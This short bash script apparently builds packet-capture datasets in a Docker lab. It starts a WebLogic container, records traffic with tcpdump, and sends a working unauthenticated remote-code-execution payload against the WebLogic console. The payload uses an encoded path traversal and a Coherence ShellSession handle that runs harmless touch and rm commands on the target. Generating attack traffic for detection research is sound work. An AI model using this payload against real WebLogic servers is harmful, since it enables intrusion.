#! /bin/bash
read -p "Enter number of .pcap files: " PACK_NUMBER

docker-compose up -d
sleep 60
for ((i = 1; i <= PACK_NUMBER; i++))
do 
    tcpdump -i br_weblogic_int  -w ${i}.pcap & 
    secret=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
    secret2=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)
    touch file
    docker cp file weblogic:/tmp/$secret2.txt
    rm file
    page_url="http://172.25.0.2:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20/tmp/youHaveBeenHacked$secret%27);%22)"
    page_url2="http://172.25.0.2:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27rm%20/tmp/$secret2.txt%27);%22)"  
    sleep 2
    docker run --net weblogic_net  --rm mwendler/wget $page_url -qO-
    sleep 2
    docker run --net weblogic_net  --rm mwendler/wget $page_url2 -qO-
    pid=$(ps -e | pgrep tcpdump)
    sleep 3
    kill -2 $pid
done
docker-compose down